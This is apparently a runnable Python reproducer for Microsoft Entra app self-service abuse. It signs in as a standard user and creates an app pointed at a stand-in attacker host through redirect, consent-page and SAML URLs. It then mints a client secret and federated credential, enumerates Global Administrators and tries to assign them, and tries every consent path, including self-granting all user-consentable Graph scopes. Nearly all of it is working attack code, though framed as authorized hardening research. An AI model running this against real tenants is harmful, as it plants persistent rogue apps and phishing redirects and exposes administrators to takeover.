#!/usr/bin/env python3
"""
AppConfAbuse2 — single-file reproducer.

Authenticates a standard user (device-code, MFA-friendly, specific-account hint), then:
  1. creates a fresh app + SP as that user
  2. applies the FULL attacker-relevant config surface incl. MAX multi-tenant hosting
     (broadest signInAudience, external redirect URIs, implicit grant, token claims, identifierUris)
  3. mints credentials (client secret + federated identity credential)
  4. attempts to add users INCL. GLOBAL ADMINS to the Enterprise App (appRoleAssignedTo)
  5. exhausts consent paths AND tries to self-grant EVERY user-consentable delegated scope
  6. reports effective permissions

Result: config succeeds broadly; effective GRANT is bounded to low-risk delegated self-consent
(User.Read). Admin consent is the wall inside the owning tenant. Classification: BY-DESIGN Entra
app self-service — documented as attack-surface / hardening analysis, not a Microsoft vuln.

The created app + SP are left in place for inspection (delete manually if desired).

Usage:
  python3 UserAppAbuse.py <tenant> [account-upn]

  <tenant>       tenant GUID or domain (e.g. contoso.onmicrosoft.com)
  [account-upn]  optional login_hint — pre-fills the intended account (verify /me echo after auth)

Owner-authorized lab / bug-bounty research only.
"""
import json, sys, time, urllib.request, urllib.parse, urllib.error

# --------------------------------------------------------------------------------------------
# constants — global, identical in every tenant (NOT lab-specific)
GRAPH_APPID = "00000003-0000-0000-c000-000000000000"        # Microsoft Graph
PUBLIC_CLIENT = "14d82eec-204b-4c2f-b7e8-296a70dab67e"      # Microsoft Graph Command Line Tools
V1 = "https://graph.microsoft.com/v1.0"
EVIL = "https://attacker.evil.example/callback"

DELEGATED = {   # oauth2PermissionScopes ids
    "User.Read":          "e1fe6dd8-ba31-4d61-89e7-88639da4683d",
    "Mail.Read":          "570282fd-fa5c-430d-a7fd-fc8dc98a9dca",
    "Directory.Read.All": "06da0dbc-49e2-44d2-8312-53f166ab848a",
}
APP_ROLES = {   # appRoles ids (application permissions)
    "User.Read.All":      "df021288-bdef-4463-88db-98f22de89214",
    "Directory.Read.All": "7ab1d382-f21e-4acd-a863-ba3e13f7da61",
}
GA_ROLE_TEMPLATE = "62e90394-69f5-4237-9190-012177145e10"   # Global Administrator (roleTemplateId, global)
CUSTOM_ROLE_ID = "d1111111-1111-1111-1111-111111111111"     # the Admin.All appRole this script defines
DEFAULT_ACCESS = "00000000-0000-0000-0000-000000000000"     # appRoleId meaning "default access" (no role)

# --------------------------------------------------------------------------------------------
# args
HELP = """UserAppAbuse — standard-user app configuration & consent-boundary reproducer

usage: python3 UserAppAbuse.py <upn>
       python3 UserAppAbuse.py <tenant> [account-upn]

  <upn>          a full user principal name (user@domain.com). The tenant is derived
                 from the domain part and the UPN is used as the sign-in hint.
  <tenant>       tenant GUID or domain (e.g. contoso.onmicrosoft.com), or
                 'organizations' to choose the account in the browser
  [account-upn]  optional login_hint that pre-fills the intended account

examples:
  # simplest: just the UPN — tenant is inferred from the domain
  python3 UserAppAbuse.py alice@contoso.onmicrosoft.com

  # pick the account interactively in the browser (any tenant you can sign into)
  python3 UserAppAbuse.py organizations

  # target a tenant by domain, pre-fill a specific account
  python3 UserAppAbuse.py contoso.onmicrosoft.com alice@contoso.onmicrosoft.com

  # target a tenant by GUID
  python3 UserAppAbuse.py dbf22f42-e951-4d07-8579-1400a6f9a473 alice@contoso.onmicrosoft.com

  # run directly (executable bit is set) — no sudo
  ./UserAppAbuse.py alice@contoso.onmicrosoft.com

  # show this help
  python3 UserAppAbuse.py --help

notes:
  - run with python3, NOT sudo (no root/privileged ports needed — outbound HTTPS only)
  - device-code sign-in: open the printed URL, enter the code, complete MFA
  - stdlib-only; no pip install required
  - creates an app 'UserAppAbuse-Probe' + SP; left in place for inspection (delete manually)
"""

if len(sys.argv) < 2 or sys.argv[1] in ("-h", "--help"):
    print(HELP)
    raise SystemExit(0 if len(sys.argv) > 1 else 2)

# Arg forms:
#   1) <upn>                    -> tenant = domain(upn), login_hint = upn
#   2) <tenant> [account-upn]   -> explicit tenant, optional hint
arg1 = sys.argv[1]
if "@" in arg1:
    LOGIN_HINT = arg1
    TENANT = arg1.split("@", 1)[1]          # derive tenant from the UPN domain
else:
    TENANT = arg1
    LOGIN_HINT = sys.argv[2] if len(sys.argv) > 2 else None


# --------------------------------------------------------------------------------------------
def form_post(url, form):
    r = urllib.request.urlopen(urllib.request.Request(
        url, data=urllib.parse.urlencode(form).encode(),
        headers={"Content-Type": "application/x-www-form-urlencoded"}), timeout=60)
    return json.loads(r.read())


def step(msg):
    """Uniform progress line."""
    print(f"[*] {msg}", flush=True)


def get_token():
    step(f"tenant='{TENANT}'  hint={LOGIN_HINT or '(none — choose in browser)'}")
    step("requesting device code from Entra ...")
    dc_form = {"client_id": PUBLIC_CLIENT,
               "scope": "https://graph.microsoft.com/.default offline_access openid profile"}
    if LOGIN_HINT:
        dc_form["login_hint"] = LOGIN_HINT
    try:
        dc = form_post(f"https://login.microsoftonline.com/{TENANT}/oauth2/v2.0/devicecode", dc_form)
    except urllib.error.HTTPError as e:
        body = e.read().decode(errors="replace")
        try:
            err = json.loads(body)
            raise SystemExit(f"[fatal] devicecode request -> {e.code} {err.get('error')}: {err.get('error_description', '')[:300]}")
        except json.JSONDecodeError:
            raise SystemExit(f"[fatal] devicecode request -> {e.code}: {body[:300]}")
    if LOGIN_HINT:
        print(f"\n[!] Sign in AS: {LOGIN_HINT}  (verify the account before approving)")
    print("\n" + dc["message"] + "\n", flush=True)
    interval = dc.get("interval", 5)
    waited = 0
    while True:
        time.sleep(interval)
        waited += interval
        try:
            tok = form_post(f"https://login.microsoftonline.com/{TENANT}/oauth2/v2.0/token",
                            {"grant_type": "urn:ietf:params:oauth:grant-type:device_code",
                             "client_id": PUBLIC_CLIENT, "device_code": dc["device_code"]})
            step(f"authenticated (after {waited}s)")
            return tok["access_token"]
        except urllib.error.HTTPError as e:
            err = json.loads(e.read()).get("error", "")
            if err in ("authorization_pending", "slow_down"):
                print(f"    ... waiting for sign-in ({waited}s elapsed)", flush=True)
                if err == "slow_down":
                    interval += 5
                continue
            raise SystemExit(f"[fatal] device-code auth stopped: {err}")


def call(at, path, method="GET", body=None):
    path = path.replace(" ", "%20").replace("'", "%27")
    data = json.dumps(body).encode() if body is not None else None
    req = urllib.request.Request(V1 + path, data=data, method=method,
                                 headers={"Authorization": "Bearer " + at,
                                          "Content-Type": "application/json"})
    try:
        r = urllib.request.urlopen(req, timeout=45)
        raw = r.read()
        return r.getcode(), (json.loads(raw) if raw else {})
    except urllib.error.HTTPError as e:
        try:
            return e.code, json.loads(e.read())
        except Exception:
            return e.code, {}


def ec(b):
    return b.get("error", {}).get("code", "") if isinstance(b, dict) else ""


# --------------------------------------------------------------------------------------------
# 0. authenticate
print("=" * 78)
print("AppConfAbuse2 — single-file reproducer")
print("=" * 78)
AT = get_token()

# 0b. resolve + verify actor and this tenant's Graph SP (never hardcode either)
s, me = call(AT, "/me?$select=id,userPrincipalName")
if s != 200:
    raise SystemExit(f"[fatal] /me failed ({s} {ec(me)}) — bad token/tenant.")
OID, UPN = me["id"], me.get("userPrincipalName", "?")
s, gsp = call(AT, f"/servicePrincipals(appId='{GRAPH_APPID}')")
if s != 200 or "id" not in gsp:
    raise SystemExit(f"[fatal] could not resolve Microsoft Graph SP ({s} {ec(gsp)}).")
GRAPH = gsp["id"]

s, rb = call(AT, "/me/transitiveMemberOf/microsoft.graph.directoryRole?$select=displayName")
roles = [r.get("displayName") for r in rb.get("value", [])] if isinstance(rb, dict) else []
print(f"\n[actor]  {UPN}  oid={OID}")
print(f"[roles]  {roles or 'NONE (standard user)'}   <-- verify this is the account you intended")
print(f"[graph]  Microsoft Graph SP (this tenant) = {GRAPH}")

# --------------------------------------------------------------------------------------------
# 1. create app + SP
print("\n=== phase 1/6 : create app + service principal ===")
step("create a fresh app as a standard user (needs allowedToCreateApps=true)")
s, b = call(AT, "/applications", "POST",
            {"displayName": "UserAppAbuse-Probe", "signInAudience": "AzureADMyOrg"})
APPOBJ, APPID = b.get("id"), b.get("appId")
print(f"   app [{s}] appId={APPID} obj={APPOBJ}")
if not APPOBJ:
    raise SystemExit(f"[fatal] app creation denied ({s} {ec(b)}). allowedToCreateApps likely false.")
s, b = call(AT, "/servicePrincipals", "POST", {"appId": APPID})
SP = b.get("id")
print(f"   sp  [{s}] spId={SP}")
time.sleep(3)

# --------------------------------------------------------------------------------------------
# 2. full config surface
APP_CFGS = [
    ("signInAudience=AzureADMultipleOrgs (MULTI-TENANT)", {"signInAudience": "AzureADMultipleOrgs"}),
    ("web.redirectUris (attacker host)",   {"web": {"redirectUris": [EVIL]}}),
    ("web.implicitGrant (id+access token)", {"web": {"implicitGrantSettings": {"enableAccessTokenIssuance": True, "enableIdTokenIssuance": True}}}),
    ("spa.redirectUris",                   {"spa": {"redirectUris": [EVIL]}}),
    ("publicClient.redirectUris",          {"publicClient": {"redirectUris": ["http://localhost", "myapp://cb"]}}),
    ("groupMembershipClaims=All",          {"groupMembershipClaims": "All"}),
    ("optionalClaims (groups/upn)",        {"optionalClaims": {"accessToken": [{"name": "groups"}], "idToken": [{"name": "upn"}], "saml2Token": []}}),
    ("api.requestedAccessTokenVersion=2",  {"api": {"requestedAccessTokenVersion": 2}}),
    ("requiredResourceAccess (REQUEST User.Read + high-priv app perms)",
        {"requiredResourceAccess": [{"resourceAppId": GRAPH_APPID, "resourceAccess": [
            {"id": DELEGATED["User.Read"], "type": "Scope"},
            {"id": APP_ROLES["User.Read.All"], "type": "Role"},
            {"id": APP_ROLES["Directory.Read.All"], "type": "Role"}]}]}),
    ("info.* consent-screen URLs",         {"info": {"marketingUrl": EVIL, "termsOfServiceUrl": EVIL, "privacyStatementUrl": EVIL}}),
    ("isFallbackPublicClient",             {"isFallbackPublicClient": True}),
    ("appRoles (define Admin.All)",        {"appRoles": [{"allowedMemberTypes": ["User", "Application"], "description": "x", "displayName": "Admin.All", "id": CUSTOM_ROLE_ID, "isEnabled": True, "value": "Admin.All"}]}),
    # --- MAX multi-tenant hosting: make the app consumable by as many external tenants as possible ---
    ("identifierUris = api://<appid>",     {"identifierUris": [f"api://{APPID}"]}),
    ("signInAudience=AzureADMultipleOrgs (all Entra orgs)", {"signInAudience": "AzureADMultipleOrgs"}),
    ("signInAudience=AzureADandPersonalMicrosoftAccounts (BROADEST — orgs + MSA consumers)",
        {"signInAudience": "AzureADandPersonalMicrosoftAccounts", "api": {"requestedAccessTokenVersion": 2}}),
]
print("\n=== phase 2/6 : apply full config surface (incl. MAX multi-tenant hosting) ===")
print(f"[application-object configs] ({len(APP_CFGS)} writes)")
for i, (label, body) in enumerate(APP_CFGS, 1):
    s, b = call(AT, f"/applications/{APPOBJ}", "PATCH", body)
    print(f"   [{i:2}/{len(APP_CFGS)}] [{s} {ec(b)}] {label}")

SP_CFGS = [
    ("appRoleAssignmentRequired",           {"appRoleAssignmentRequired": True}),
    ("loginUrl (IdP-initiated SSO)",        {"loginUrl": EVIL}),
    ("preferredSingleSignOnMode=saml",      {"preferredSingleSignOnMode": "saml"}),
    ("replyUrls",                           {"replyUrls": [EVIL]}),
    ("samlSingleSignOnSettings.relayState", {"samlSingleSignOnSettings": {"relayState": EVIL}}),
    ("notificationEmailAddresses=attacker", {"notificationEmailAddresses": ["attacker@evil.example"]}),
]
print(f"[service-principal configs] ({len(SP_CFGS)} writes)")
for i, (label, body) in enumerate(SP_CFGS, 1):
    s, b = call(AT, f"/servicePrincipals/{SP}", "PATCH", body)
    print(f"   [{i:2}/{len(SP_CFGS)}] [{s} {ec(b)}] {label}")

# --------------------------------------------------------------------------------------------
# 3. credentials
print("\n=== phase 3/6 : mint credentials ===")
s, b = call(AT, f"/applications/{APPOBJ}/addPassword", "POST", {"passwordCredential": {"displayName": "k"}})
print(f"   [{s}] addPassword (client secret) {'OK' if s == 200 else ec(b)}")
s, b = call(AT, f"/applications/{APPOBJ}/federatedIdentityCredentials", "POST",
            {"name": "fic1", "issuer": "https://token.actions.githubusercontent.com",
             "subject": "repo:o/r:ref:refs/heads/main", "audiences": ["api://AzureADTokenExchange"]})
print(f"   [{s}] federatedIdentityCredential (passwordless) {'OK' if s in (200, 201) else ec(b)}")

# --------------------------------------------------------------------------------------------
# 4. add users (incl. Global Admins) to the Enterprise App's "Users and groups"
print("\n=== phase 4/6 : add users (incl. Global Admins) to the Enterprise App ===")
ga = []
s, b = call(AT, f"/directoryRoles(roleTemplateId='{GA_ROLE_TEMPLATE}')/members?$select=id,userPrincipalName")
if s == 200 and isinstance(b, dict):
    ga = [(m.get("id"), m.get("userPrincipalName", "?")) for m in b.get("value", []) if m.get("id")]
    print(f"[enum] Global Administrators visible: {len(ga)}  ({[u for _, u in ga] or 'none returned'})")
else:
    print(f"[enum] could not read Global Administrators ({s} {ec(b)}) — directory read may be restricted")

targets = ga + [(OID, UPN + " (self / control)")]
print(f"[assign] attempting appRoleAssignedTo on the enterprise app for {len(targets)} principal(s)")
for pid, label in targets:
    s, b = call(AT, f"/servicePrincipals/{SP}/appRoleAssignedTo", "POST",
                {"principalId": pid, "resourceId": SP, "appRoleId": CUSTOM_ROLE_ID})
    if s not in (200, 201):
        s2, b2 = call(AT, f"/servicePrincipals/{SP}/appRoleAssignedTo", "POST",
                      {"principalId": pid, "resourceId": SP, "appRoleId": DEFAULT_ACCESS})
        print(f"   [{s} {ec(b)} -> retry default-access {s2} {ec(b2)}] {label}")
    else:
        print(f"   [{s}] assigned (Admin.All role) {label}")

# --------------------------------------------------------------------------------------------
# 5. consent exhaustion — the boundary
print("\n=== phase 5/6 : consent exhaustion + grant-all user-consentable ===")
print("[consent boundary] what the standard-user owner can actually GRANT")
print(" [1] delegated self-consent (consentType=Principal)")
for sc in ["User.Read", "Mail.Read", "Directory.Read.All"]:
    s, b = call(AT, "/oauth2PermissionGrants", "POST",
                {"clientId": SP, "consentType": "Principal", "principalId": OID,
                 "resourceId": GRAPH, "scope": sc})
    print(f"     [{s} {ec(b)}] self-consent '{sc}'")
print(" [2] admin consent (consentType=AllPrincipals) — even the lowest scope")
for sc in ["User.Read", "Directory.Read.All"]:
    s, b = call(AT, "/oauth2PermissionGrants", "POST",
                {"clientId": SP, "consentType": "AllPrincipals", "resourceId": GRAPH, "scope": sc})
    print(f"     [{s} {ec(b)}] admin-consent '{sc}'")
print(" [3] application permissions (appRoleAssignments)")
for name in ["User.Read.All", "Directory.Read.All"]:
    s, b = call(AT, f"/servicePrincipals/{SP}/appRoleAssignments", "POST",
                {"principalId": SP, "resourceId": GRAPH, "appRoleId": APP_ROLES[name]})
    print(f"     [{s} {ec(b)}] app-perm '{name}'")

print(" [4] grant ALL user-consentable delegated scopes (self-consent)")
s, b = call(AT, f"/servicePrincipals(appId='{GRAPH_APPID}')?$select=oauth2PermissionScopes")
scopes = b.get("oauth2PermissionScopes", []) if isinstance(b, dict) else []
user_scopes = sorted({x.get("value") for x in scopes
                      if x.get("type") == "User" and x.get("isEnabled") and x.get("value")})
print(f"     [enum] {len(user_scopes)} user-consentable delegated Graph scopes exposed by this tenant")
if user_scopes:
    scope_str = " ".join(user_scopes)
    s, b = call(AT, f"/oauth2PermissionGrants?$filter=clientId eq '{SP}' and principalId eq '{OID}'")
    existing = (b.get("value") or [None])[0] if isinstance(b, dict) else None
    if existing:   # a User.Read grant already exists from [1] — widen it in place
        s, b = call(AT, f"/oauth2PermissionGrants/{existing['id']}", "PATCH", {"scope": scope_str})
        print(f"     [{s} {ec(b)}] PATCH existing grant -> {len(user_scopes)} scopes")
    else:
        s, b = call(AT, "/oauth2PermissionGrants", "POST",
                    {"clientId": SP, "consentType": "Principal", "principalId": OID,
                     "resourceId": GRAPH, "scope": scope_str})
        print(f"     [{s} {ec(b)}] POST grant -> {len(user_scopes)} scopes")

# --------------------------------------------------------------------------------------------
# 6. effective permissions
print("\n=== phase 6/6 : effective permissions ===")
print("[effective] permissions actually in force on the app")
s, b = call(AT, f"/oauth2PermissionGrants?$filter=clientId eq '{SP}'")
deleg = [(g.get("scope", "").strip(), g.get("consentType")) for g in b.get("value", [])] if isinstance(b, dict) else []
print("   delegated:  ", deleg or "NONE")
s, b = call(AT, f"/servicePrincipals/{SP}/appRoleAssignments?$select=resourceDisplayName")
app = [x.get("resourceDisplayName") for x in b.get("value", [])] if isinstance(b, dict) and "value" in b else []
print("   application:", app or "NONE")
s, b = call(AT, f"/servicePrincipals/{SP}/appRoleAssignedTo?$select=principalDisplayName,principalId")
assigned = [x.get("principalDisplayName") for x in b.get("value", [])] if isinstance(b, dict) and "value" in b else []
print("   users/groups on the enterprise app:", assigned or "NONE")

art = {"actor_upn": UPN, "actor_oid": OID, "roles": roles, "graph_sp": GRAPH,
       "app_obj": APPOBJ, "app_id": APPID, "sp": SP,
       "user_consentable_scopes": user_scopes, "assigned_principals": assigned}
json.dump(art, open("run_artifacts.json", "w"), indent=2)

print("\n" + "=" * 78)
print("RESULT: config applied broadly; effective grant bounded to low-risk delegated self-consent.")
print("Admin consent is the wall INSIDE the owning tenant. (Cross-tenant serving = separate risk.)")
print(f"artifacts -> run_artifacts.json   app={APPID}  sp={SP}")
print("app + SP left in place for inspection (delete manually if desired).")
print("=" * 78)
